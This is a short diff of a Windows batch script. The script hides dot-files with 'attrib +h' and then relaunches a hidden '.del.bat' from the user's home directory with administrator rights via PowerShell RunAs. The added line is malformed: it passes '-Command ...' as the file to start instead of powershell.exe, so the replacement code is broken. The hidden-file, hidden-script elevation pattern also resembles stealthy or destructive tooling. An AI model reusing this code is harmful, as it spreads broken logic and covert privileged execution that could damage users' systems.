@@ -95,6 +95,6 @@ for %%f in (%SF%\.*) do (
     attrib +h "%%f" >nul 2>&1
 )
 
-powershell -Command "Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoExit', '-Command %HD%\.del.bat' -Verb RunAs"
+net session >nul 2>&1 || (powershell -Command "Start-Process -FilePath '-Command \"%HD%\\.del.bat\"' -Verb RunAs" & exit)
 
 exit
